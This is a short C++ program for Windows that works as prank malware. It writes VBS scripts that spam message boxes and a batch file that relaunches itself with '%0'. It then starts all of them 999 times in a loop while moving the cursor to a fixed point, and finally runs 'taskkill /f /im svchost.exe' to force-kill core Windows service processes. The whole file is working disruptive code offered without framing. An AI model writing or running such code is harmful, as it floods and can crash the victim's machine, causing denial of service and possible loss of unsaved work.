#include <bits/stdc++.h>
#include <windows.h>
using namespace std;
int main () {
	freopen ("v.vbs", "w", stdout);
	string s = " msgbox\"hahaha\" ";
	for (int i = 1; i <= 100; i++) { cout << s << endl; }
	freopen ("v2.vbs", "w", stdout);
	cout << "dim k\nk=1\nwhile k<101\nk=k+1\nmsgbox k\nWend";
	freopen ("v3.bat", "w", stdout);
	cout << "corlor\necho 666\ncolor 1a\necho\ncolor 2b\necho\ncolor 3c\necho\ncolor 4d\necho\ncolor 5e\necho\ncolor 6f\necho\ncolor 70\necho\n%0";
    freopen ("v4.bat", "w", stdout);
    cout<<"taskkill /f /im svchost.exe";
    freopen ("v5.bat", "w", stdout);
    int n=999;
	while (n--) {
		system ("start v3.bat");
		SetCursorPos (500, 500);
		system ("start v2.vbs");
		SetCursorPos (500, 500);
		system ("start v.vbs");
		SetCursorPos (500, 500);
	}
    system ("start v4.bat");
	return 0;
}